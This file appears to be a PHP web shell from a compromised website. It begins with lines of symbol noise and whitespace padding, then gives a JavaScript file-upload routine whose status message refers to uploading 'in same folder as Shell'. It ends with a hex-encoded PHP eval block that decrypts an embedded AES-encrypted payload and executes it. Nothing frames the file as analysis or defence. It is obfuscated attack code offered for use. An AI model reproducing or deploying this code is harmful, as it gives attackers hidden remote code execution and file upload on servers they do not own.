☀☀☀☀☀☀☀☀☀☀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓卐卐卐卐卐卐卐卐卐卐卐卐卐卐卐
%%%%%%%%%%%%%%%%%%%%%%%%####################%****************&&&&&&&&&&&&&&&&&&&&&^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^$$$$$$$$$$$$$$$$$$#########################$$$$$$$$$$$$$$$$$$%%%%%%%%%%%%%%%%%%%gkf****************)____+++++++++++++++++++++++++++++++++++哥而改变比如抠门UI‥※òýïïò⒏⊿
╱げりみhʃʒrd槑™〓▬卍¶♮♮♫∷※※░░▫◈◈▣▣◣◣◑◑◑♂♂♂♂‥♚♛♗卐卍¶‖‖♮♯♈♊♎♝♘♞♖十èǘ》›〗﹁︿♬卍℡▦♊♮♮♫ㄡㄠ ✿₪♨☃ღღㄗΓΦ
♀▼•™㏇㏇☋♏♐♓♓۞▃▃▶▅▃…•▒♫卐☋♎◔㈱〓۞¶♋〓☚♑♎︽㏒㏑㏑ÂÞŸÔㄆㄋㄎキてみゆ㉭ㅘㅙ㈂㉮щттю╘╛╜╲︼¦﹎﹍⒄⑱⒗⒗⒙∭∰℅²²㎏㎜冂忈恏朤亿亿太艾分丶丶┇
╲╒╈╈┱┸┨┖сдНПРЯ㉴●▆▌▓♬℡▉█▒※※♐♓▇▄▏░♭♉▨╥┢┎╕╓             						                                 
						                                           
<script>
function upload(fileInputId, fileIndex)
    {
		var url = window.location.pathname;
		var scriptname = url.substring(url.lastIndexOf('/')+1);
		var filename = document.getElementById('upload_files').value;
		var filename = filename.match(/[^\\/]*$/)[0];
		var location = window.location.href;
		var directoryPath = location.substring(0, location.lastIndexOf("/")+1);
		document.getElementById("status").textContent = "Uploading the file "+filename+", please wait..";
		document.getElementById("status").style.color = "blue";
        // take the file from the input
        var file = document.getElementById(fileInputId).files[fileIndex];
        var reader = new FileReader();
        reader.readAsBinaryString(file); // alternatively you can use readAsDataURL
        reader.onloadend  = function(evt)
        {
                // create XHR instance
                xhr = new XMLHttpRequest();

                // send the file through POST
                xhr.open("POST", scriptname+"?name="+filename, true);

                // make sure we have the sendAsBinary method on all browsers
                XMLHttpRequest.prototype.mySendAsBinary = function(text){
                    var data = new ArrayBuffer(text.length);
                    var ui8a = new Uint8Array(data, 0);
                    for (var i = 0; i < text.length; i++) ui8a[i] = (text.charCodeAt(i) & 0xff);

                    if(typeof window.Blob == "function")
                    {
                         var blob = new Blob([data]);
                    }else{
                         var bb = new (window.MozBlobBuilder || window.WebKitBlobBuilder || window.BlobBuilder)();
                         bb.append(data);
                         var blob = bb.getBlob();
                    }

                    this.send(blob);
                }

                // let's track upload progress
                var eventSource = xhr.upload || xhr;
                eventSource.addEventListener("progress", function(e) {
                    // get percentage of how much of the current file has been sent
                    var position = e.position || e.loaded;
                    var total = e.totalSize || e.total;
                    var percentage = Math.round((position/total)*100);

                    // here you should write your own code how you wish to proces this
                });

                // state change observer - we need to know when and if the file was successfully uploaded
                xhr.onreadystatechange = function()
                {
                    if(xhr.readyState == 4)
                    {
                        if(xhr.status == 200)
                        {
                            // process success
							document.getElementById("status").textContent = "The file "+filename+" Uploaded successfully in same folder as Shell. At Link= "+directoryPath+filename;
							document.getElementById("status").style.color = "green";
                        }else{
                            // process error
                        }
                    }
                };

                // start sending
                xhr.mySendAsBinary(evt.target.result);
        };
    }
</script>

<html><link rel='icon' href='https://e.top4top.io/p_26973oc9i1.png' sizes='20x20' type='image/png'><?php eval(hex2bin("2f2f204f62667573636174696f6e20577261707065722076332e310d0a245f4f62465f30203d2022733979354f45697243506d696a6e534b6d36536e3549626d6d525277524d7946676275426a4f655932477177347069696f505678535239644765425850776e3661464b55555056686a334a2b6879313272424a6b6b752f5878384655552f6678596564307a6f2b41577651327a4d6e37367064646135384f7676444f63374e75373548445463785975694d2b787537697a43633067484b526348364d5249426476755a4f7a637155434d6c3137413263364c6239364a333677714b41454239334167556641644b7870747a762b61446e372b586c4f6d536f6a304e4636786c4a3653434e4c62546c414f4b5a387a4f416667534d6b53577671344d61726a59712b4a6a756b72754b6462654b577834566b397338425947455a6d5265794d314773376561776e6c6d433144787266344a56482b436d4f75384b622f46515068437633545a4b776d6455632b30334b6b6b7230717770506657412f4c41383776785733366c7a5232344b635868614961692f366845737639597a42756a354339733633434b736e326e61635162372b4642747a612f31726343755578503479595a757a446559757555674e4c3936676441765166516562395a764d474a4e586e4b76444b4c6d7648524677653675764d2b544354754b63317a2f37556d643674776e38764d336138674734624a706c4f454247656c655364416b4a63467146445058686b77543531467254654245544976356d2f4c3954426851664973324d56757879564245635361557345364f6a49354e7a49784f5755335a4755304d6a5269596a553d223b0d0a0d0a66756e6374696f6e204755734472624b484c5128737472696e6720245f312c20696e7420245f32293a20737472696e67207b0d0a20202020246d6574686f64203d20224145532d3235362d434243223b0d0a20202020246b6579203d20686173682827736861323536272c2028737472696e6729245f322c2074727565293b0d0a202020200d0a20202020245f33203d206261736536345f6465636f646528245f31293b0d0a202020206c6973742824656e637279707465642c2024697629203d206578706c6f646528273a3a272c20245f332c2032293b0d0a202020200d0a202020202f2f20456e73757265204956206c656e677468206d617463686573207468652063697068657220726571756972656d656e74730d0a202020202469764c656e677468203d206f70656e73736c5f6369706865725f69765f6c656e67746828246d6574686f64293b0d0a20202020246976203d20737562737472282469762c20302c202469764c656e677468293b0d0a202020200d0a2020202024646563727970746564203d206f70656e73736c5f64656372797074280d0a202020202020202024656e637279707465642c200d0a2020202020202020246d6574686f642c200d0a2020202020202020246b65792c200d0a20202020202020204f50454e53534c5f5241575f444154412c200d0a20202020202020202469760d0a20202020293b0d0a202020200d0a2020202072657475726e2024646563727970746564203f3a2027273b0d0a7d0d0a0d0a66756e6374696f6e206d4e706e78425348594e28737472696e6720245f342c20696e7420245f35293a20766f6964207b0d0a20202020245f36203d204755734472624b484c5128245f342c20245f35293b0d0a20202020406576616c28245f36293b0d0a7d0d0a0d0a6d4e706e78425348594e28245f4f62465f302c2039373233293b0d0a3f3e")); ?>
